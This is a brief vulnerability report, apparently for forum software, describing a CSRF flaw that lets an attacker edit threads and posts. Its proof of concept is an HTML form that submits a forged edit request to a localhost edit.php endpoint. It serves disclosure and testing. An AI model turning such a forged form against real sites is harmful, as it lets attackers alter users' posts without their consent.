# Edit Threads/Posts CSRF
Allows to edit threads and posts through CSRF.

## PoC:
```html
<link href="http://localhost/public/themes/Sand/assets/css/sand.css" rel="stylesheet">

<form id="LAYER_form" action="http://localhost/edit.php/post/1" method="POST" style="padding: 25px;">
    <input id="title" name="title" type="text" value="test"><br>
    <textarea id="editor" name="content" style="width: 100%; height: 300px; max-width: 100%; min-width: 100%;">test post</textarea>
    <br>
    <input type="submit" name="edit" value="Edit Post">
</form>
```
